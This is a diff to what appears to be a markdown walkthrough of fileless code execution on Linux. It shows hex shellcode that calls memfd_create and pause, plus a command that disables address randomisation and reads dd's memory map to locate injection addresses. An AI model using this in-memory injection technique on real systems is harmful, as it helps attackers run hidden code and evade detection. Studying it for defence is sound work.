@@ -97,3 +97,16 @@ nasm memfd.asm
 hexdump -v -e '"\\""x" 1/1 "%02x" ""' memfd
 ```
 - ```\x48\x31\xc0\x48\x31\xff\x66\xbf\x0a\x00\xb8\x20\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\xff\xc7\xb8\x20\x00\x00\x00\x0f\x05\x68\x73\x6f\x43\x78\x48\x89\xe7\xbe\x00\x00\x00\x00\xb8\x3f\x01\x00\x00\x0f\x05\xb8\x22\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05```
+
+next, we find the PID addresses for DD fclose,
+
+```shell
+setarch x86_64 -R dd if=/proc/self/maps | grep "bin/dd"
+```
+- ```
+555555554000-555555556000 r--p 00000000 ca:01 262762                     /usr/bin/dd
+555555556000-555555564000 r-xp 00002000 ca:01 262762                     /usr/bin/dd
+555555564000-555555569000 r--p 00010000 ca:01 262762                     /usr/bin/dd
+555555569000-55555556a000 r--p 00014000 ca:01 262762                     /usr/bin/dd
+55555556a000-55555556b000 rw-p 00015000 ca:01 262762                     /usr/bin/dd
+```
